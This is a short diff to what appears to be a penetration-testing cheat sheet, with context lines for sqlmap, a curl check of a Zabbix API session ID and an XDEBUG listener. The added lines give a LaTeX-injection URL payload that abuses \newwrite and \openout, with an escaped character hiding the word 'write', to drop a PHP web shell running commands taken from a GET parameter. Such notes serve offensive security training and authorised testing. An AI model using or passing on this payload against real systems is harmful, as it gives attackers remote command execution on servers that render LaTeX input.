@@ -398,6 +398,9 @@ sqlmap \
 +---------- Verify Session ID ----------+
 curl -X POST http://$TARGET/zabbix/api_jsonrpc.php -H "Content-Type: application/json-rpc" -d '{"jsonrpc": "2.0","method": "user.checkAuthentication","params": {"sessionid": "fdcfbcb99704cba0bf030d626d671510"},"id": 1}'
 
+[*] LaTeX
+http://$TARGET/equation.php?eqn=\newwrite\outfile\openout\outfile=x.php\^^77rite\outfile{<?=`$_GET[cmd]`?>}\closeout\outfile
+
 [*] XDEBUG_SESSION
 +---------- Start Listener ----------+
 python3 XDEBUG_SESSION.py
